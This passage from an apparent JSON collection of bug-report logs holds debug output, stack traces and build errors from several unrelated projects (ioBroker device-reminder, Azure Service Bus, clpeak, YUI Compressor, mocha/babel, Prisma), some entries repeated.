\"0\"\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.77\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 4, Inhalt: [66.81,66.81,68.72,68.72]\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n[Truncated]\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:36.185 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:36.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.96\r\n2021-07-14 21:13:36.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 5, Inhalt: [66.81,66.81,68.72,68.72,68.72]\r\n2021-07-14 21:13:36.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:36.191 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:36.193 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: value status: 1\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: in action (in action)\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Ger\u00e4t gestartet, device l\u00e4uft\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: GESTARTET\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.308 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.309 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet"
    },
    {
        "logs": "Traceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 246, in _do_retryable_operation\r\n    return await operation(**kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_servicebus_receiver_async.py\", line 317, in _open\r\n    await self._handler.open_async(connection=self._connection)\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 246, in open_async\r\n    await self._build_session_async()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 192, in _build_session_async\r\n    self._connection._cbs = await asyncio.shield(\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 279, in create_authenticator_async\r\n    await self.update_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 283, in update_token\r\n    access_token = await self.get_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/default.py\", line 129, in get_token\r\n    return await super().get_token(*scopes, **kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/chained.py\", line 80, in get_token\r\n    raise ClientAuthenticationError(message=message)\r\nazure.core.exceptions.ClientAuthenticationError: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/fastapi_utils/tasks.py\", line 64, in loop\r\n    await func()  # type: ignore\r\n  File \"/api/./main.py\", line 59, in update_deployment_status\r\n    await receive_message_and_update_deployment(app)\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 111, in receive_message_and_update_deployment\r\n    async for message in receive_message_gen:\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 41, in receive_message\r\n    async with receiver:\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 169, in __aenter__\r\n    await self._open_with_retry()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 370, in _open_with_retry\r\n    return await self._do_retryable_operation(self._open)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 250, in _do_retryable_operation\r\n    last_exception = await self._handle_exception(exception)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 198, in _handle_exception\r\n    raise error\r\nazure.servicebus.exceptions.ServiceBusError: Handler failed: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'."
    },
    {
        "logs": "Traceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 246, in _do_retryable_operation\r\n    return await operation(**kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_servicebus_receiver_async.py\", line 317, in _open\r\n    await self._handler.open_async(connection=self._connection)\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 246, in open_async\r\n    await self._build_session_async()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 192, in _build_session_async\r\n    self._connection._cbs = await asyncio.shield(\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 279, in create_authenticator_async\r\n    await self.update_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 283, in update_token\r\n    access_token = await self.get_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/default.py\", line 129, in get_token\r\n    return await super().get_token(*scopes, **kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/chained.py\", line 80, in get_token\r\n    raise ClientAuthenticationError(message=message)\r\nazure.core.exceptions.ClientAuthenticationError: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/fastapi_utils/tasks.py\", line 64, in loop\r\n    await func()  # type: ignore\r\n  File \"/api/./main.py\", line 59, in update_deployment_status\r\n    await receive_message_and_update_deployment(app)\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 111, in receive_message_and_update_deployment\r\n    async for message in receive_message_gen:\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 41, in receive_message\r\n    async with receiver:\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 169, in __aenter__\r\n    await self._open_with_retry()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 370, in _open_with_retry\r\n    return await self._do_retryable_operation(self._open)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 250, in _do_retryable_operation\r\n    last_exception = await self._handle_exception(exception)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 198, in _handle_exception\r\n    raise error\r\nazure.servicebus.exceptions.ServiceBusError: Handler failed: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'."
    },
    {
        "logs": "root@DUT2928-PVC:/home/gta/clpeak/build# cmake ..\r\n-- Setting build type to Release\r\nCMake Warning (dev) in CMakeLists.txt:\r\n  No project() command is present.  The top-level CMakeLists.txt file must\r\n  contain a literal, direct call to the project() command.  Add a line of\r\n  code such as\r\n\r\n  project(ProjectName)\r\n  near the top of the file, but after cmake_minimum_required().\r\n  CMake is pretending there is a \"project(Project)\" command on the first\r\n  line.\r\n\r\nThis warning is for project developers.  Use -Wno-dev to suppress it.\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build/clhpp/build\r\n[ 12%] Performing update step for 'hpp_headers'\r\nCurrent branch master is up to date.\r\n[ 25%] Performing configure step for 'hpp_headers'\r\nCMake Error at CMakeLists.txt:43 (find_package):\r\n\r\n  By not providing \"FindOpenCLHeaders.cmake\" in CMAKE_MODULE_PATH this\r\n  project has asked CMake to find a package configuration file provided by\r\n  \"OpenCLHeaders\", but CMake did not find one.\r\n  Could not find a package configuration file provided by \"OpenCLHeaders\"\r\n  with any of the following names:\r\n\r\n    OpenCLHeadersConfig.cmake\r\n    openclheaders-config.cmake\r\n\r\n \r\n  Add the installation prefix of \"OpenCLHeaders\" to CMAKE_PREFIX_PATH or set\r\n  \"OpenCLHeaders_DIR\" to a directory containing one of the above files.  If\r\n  \"OpenCLHeaders\" provides a separate development package or SDK, be sure it\r\n  has been installed.\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/gta/clpeak/build/clhpp/build/hpp/src/hpp_headers-build/CMakeFiles/CMakeOutput.log\".\r\nmake[2]: *** [CMakeFiles/hpp_headers.dir/build.make:107: hpp/src/hpp_headers-stamp/hpp_headers-configure] Error 1\r\nmake[1]: *** [CMakeFiles/Makefile2:76: CMakeFiles/hpp_headers.dir/all] Error 2\r\nmake: *** [Makefile:84: all] Error 2\r\n-- Selected OpenCL includes from /usr/include;/home/gta/clpeak/build/clhpp_install/include\r\n-- Selected OpenCL lib /usr/lib/x86_64-linux-gnu/libOpenCL.so\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build\r\nroot@DUT2928-PVC:/home/gta/clpeak/build#"
    },
    {
        "logs": "git clone https://github.com/username_1/clpeak\r\ncd clpeak\r\ngit submodule update --init --recursive --remote\r\ngit revert db42d30028bace27cda3c7d95f122a5c14743246 #this commit is related to cl.hpp to opencl.hpp change\r\nrm -rf build; mkdir build; cd build\r\ncmake ..\r\ncmake --build ."
    },
    {
        "logs": "root@DUT2928-PVC:/home/gta/clpeak/build# cmake ..\r\n-- Setting build type to Release\r\nCMake Warning (dev) in CMakeLists.txt:\r\n  No project() command is present.  The top-level CMakeLists.txt file must\r\n  contain a literal, direct call to the project() command.  Add a line of\r\n  code such as\r\n\r\n  project(ProjectName)\r\n  near the top of the file, but after cmake_minimum_required().\r\n  CMake is pretending there is a \"project(Project)\" command on the first\r\n  line.\r\n\r\nThis warning is for project developers.  Use -Wno-dev to suppress it.\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build/clhpp/build\r\n[ 12%] Performing update step for 'hpp_headers'\r\nCurrent branch master is up to date.\r\n[ 25%] Performing configure step for 'hpp_headers'\r\nCMake Error at CMakeLists.txt:43 (find_package):\r\n\r\n  By not providing \"FindOpenCLHeaders.cmake\" in CMAKE_MODULE_PATH this\r\n  project has asked CMake to find a package configuration file provided by\r\n  \"OpenCLHeaders\", but CMake did not find one.\r\n  Could not find a package configuration file provided by \"OpenCLHeaders\"\r\n  with any of the following names:\r\n\r\n    OpenCLHeadersConfig.cmake\r\n    openclheaders-config.cmake\r\n\r\n \r\n  Add the installation prefix of \"OpenCLHeaders\" to CMAKE_PREFIX_PATH or set\r\n  \"OpenCLHeaders_DIR\" to a directory containing one of the above files.  If\r\n  \"OpenCLHeaders\" provides a separate development package or SDK, be sure it\r\n  has been installed.\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/gta/clpeak/build/clhpp/build/hpp/src/hpp_headers-build/CMakeFiles/CMakeOutput.log\".\r\nmake[2]: *** [CMakeFiles/hpp_headers.dir/build.make:107: hpp/src/hpp_headers-stamp/hpp_headers-configure] Error 1\r\nmake[1]: *** [CMakeFiles/Makefile2:76: CMakeFiles/hpp_headers.dir/all] Error 2\r\nmake: *** [Makefile:84: all] Error 2\r\n-- Selected OpenCL includes from /usr/include;/home/gta/clpeak/build/clhpp_install/include\r\n-- Selected OpenCL lib /usr/lib/x86_64-linux-gnu/libOpenCL.so\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build\r\nroot@DUT2928-PVC:/home/gta/clpeak/build#"
    },
    {
        "logs": "git clone https://github.com/username_1/clpeak\r\ncd clpeak\r\ngit submodule update --init --recursive --remote\r\ngit revert db42d30028bace27cda3c7d95f122a5c14743246 #this commit is related to cl.hpp to opencl.hpp change\r\nrm -rf build; mkdir build; cd build\r\ncmake ..\r\ncmake --build ."
    },
    {
        "logs": "2022-01-28T02:49:34.7716990Z 2022-01-28 02:49:32,15 \u001b[32mInfo\u001b[0m [agora.flash.Channel] - Alice: Publishing update tx 4: 0x5fdc75. Result: { status: Status.Rejected, reason: \"Double spend comes with a less-than-acceptable fee increase\" }"
    },
    {
        "logs": "[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8239:27:missing name after . operator\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8240:17:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:7:missing ) after argument list\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8262:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8265:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8266:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8268:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8269:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8270:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8271:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8272:10:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8273:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8274:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8275:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8288:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8289:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8290:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8291:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8292:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8293:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8294:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8296:12:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:11:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8300:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8302:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8303:8:syntax error\r\n[Truncated]\n  8791:3:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9830:7:invalid return\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9831:1:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  1:0:Compilation produced 71 syntax errors.\r\norg.mozilla.javascript.EvaluatorException: Compilation produced 71 syntax errors.\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor$1.runtimeError(YUICompressor.java:172)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:396)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:340)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.parse(JavaScriptCompressor.java:315)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.<init>(JavaScriptCompressor.java:536)\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor.main(YUICompressor.java:147)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:497)\r\n\tat com.yahoo.platform.yui.compressor.Bootstrap.main(Bootstrap.java:21)"
    },
    {
        "logs": "[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8239:27:missing name after . operator\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8240:17:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:7:missing ) after argument list\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8262:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8265:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8266:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8268:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8269:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8270:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8271:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8272:10:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8273:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8274:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8275:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8288:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8289:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8290:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8291:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8292:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8293:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8294:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8296:12:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:11:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8300:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8302:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8303:8:syntax error\r\n[Truncated]\n  8791:3:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9830:7:invalid return\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9831:1:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  1:0:Compilation produced 71 syntax errors.\r\norg.mozilla.javascript.EvaluatorException: Compilation produced 71 syntax errors.\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor$1.runtimeError(YUICompressor.java:172)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:396)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:340)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.parse(JavaScriptCompressor.java:315)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.<init>(JavaScriptCompressor.java:536)\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor.main(YUICompressor.java:147)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:497)\r\n\tat com.yahoo.platform.yui.compressor.Bootstrap.main(Bootstrap.java:21)"
    },
    {
        "logs": ".../test/title-generation.babel.js:1\r\n(function (exports, require, module, __filename, __dirname) { import { assert } from \"assert\";\r\n                                                              ^^^^^^\r\n\r\nSyntaxError: Unexpected token import\r\n    at exports.runInThisContext (vm.js:53:16)\r\n    at Module._compile (module.js:404:25)\r\n    at loader (.../node_modules/babel-register/lib/node.js:130:5)\r\n    at Object.require.extensions.(anonymous function) [as .js] (.../node_modules/babel-register/lib/node.js:140:7)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Module.require (module.js:366:17)\r\n    at require (module.js:385:17)\r\n    at .../node_modules/mocha/lib/mocha.js:216:27\r\n    at Array.forEach (native)\r\n    at Mocha.loadFiles (.../node_modules/mocha/lib/mocha.js:213:14)\r\n    at Mocha.run (.../node_modules/mocha/lib/mocha.js:453:10)\r\n    at Object.<anonymous> (.../node_modules/mocha/bin/_mocha:393:18)\r\n    at Module._compile (module.js:425:26)\r\n    at Object.Module._extensions..js (module.js:432:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Function.Module.runMain (module.js:457:10)\r\n    at startup (node.js:136:18)\r\n    at node.js:972:3"
    },
    {
        "logs": "(function (exports, require, module, __filename, __dirname) { import { getBlockAbsoluteDims, cutIntoBlocks } from '../src/js/common/lib/layout';\r\n                                                              ^^^^^^\r\nSyntaxError: Unexpected token import"
    },
    {
        "logs": ".../test/title-generation.babel.js:1\r\n(function (exports, require, module, __filename, __dirname) { import { assert } from \"assert\";\r\n                                                              ^^^^^^\r\n\r\nSyntaxError: Unexpected token import\r\n    at exports.runInThisContext (vm.js:53:16)\r\n    at Module._compile (module.js:404:25)\r\n    at loader (.../node_modules/babel-register/lib/node.js:130:5)\r\n    at Object.require.extensions.(anonymous function) [as .js] (.../node_modules/babel-register/lib/node.js:140:7)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Module.require (module.js:366:17)\r\n    at require (module.js:385:17)\r\n    at .../node_modules/mocha/lib/mocha.js:216:27\r\n    at Array.forEach (native)\r\n    at Mocha.loadFiles (.../node_modules/mocha/lib/mocha.js:213:14)\r\n    at Mocha.run (.../node_modules/mocha/lib/mocha.js:453:10)\r\n    at Object.<anonymous> (.../node_modules/mocha/bin/_mocha:393:18)\r\n    at Module._compile (module.js:425:26)\r\n    at Object.Module._extensions..js (module.js:432:10)\r\n    at Module.load (module.js:356:32)\r\n    at Function.Module._load (module.js:311:12)\r\n    at Function.Module.runMain (module.js:457:10)\r\n    at startup (node.js:136:18)\r\n    at node.js:972:3"
    },
    {
        "logs": "[docker  ] prisma_1    | org.postgresql.util.PSQLException: ERROR: missing FROM-clause entry for table \"Deployment_Alias\"\r\n[docker  ] prisma_1    |   Position: 242\r\n[docker  ] prisma_1    | \tat org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2433)\r\n[Truncated]\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgStatement.execute(PgStatement.java:365)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeWithFlags(PgPreparedStatement.java:155)\r\n[docker  ] prisma_1    | \tat org.postgresql.jdbc.PgPreparedStatement.executeQuery(PgPreparedStatement.java:118)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.ProxyPreparedStatement.executeQuery(ProxyPreparedStatement.java:52)\r\n[docker  ] prisma_1    | \tat com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeQuery(HikariProxyPreparedStatement.java)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$queryToDBIO$1(BuilderBase.scala:52)\r\n[docker  ] prisma_1    | \tat com.prisma.api.connector.jdbc.database.BuilderBase.$anonfun$jooqToDBIO$1(BuilderBase.scala:82)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70)\r\n[docker  ] prisma_1    | \tat slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\r\n[docker  ] prisma_1    | \tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\r\n[docker  ] prisma_1    | \tat java.lang.Thread.run(Thread.java:748)"
    },
    {
